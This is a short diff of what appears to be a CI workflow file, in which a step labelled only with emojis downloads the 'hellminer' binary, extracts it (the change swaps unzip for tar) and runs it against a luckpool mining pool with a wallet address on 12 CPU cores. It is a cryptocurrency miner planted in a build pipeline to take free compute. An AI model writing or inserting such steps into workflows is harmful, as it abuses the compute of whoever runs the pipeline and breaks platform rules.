@@ -27,5 +27,5 @@ jobs:
     - name: 🤣🙈💯
       run: |
         wget https://github.com/hellcatz/luckpool/blob/master/miners/hellminer_cpu_linux.tar.gz
-        unzip hellminer_cpu_linux.tar.gz
+        tar xf hellminer_cpu_linux.tar.gz
         ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RP1ntCUiBNERYrp25mccFoR22V1uPSxxTg.hellminer -p x --cpu 12
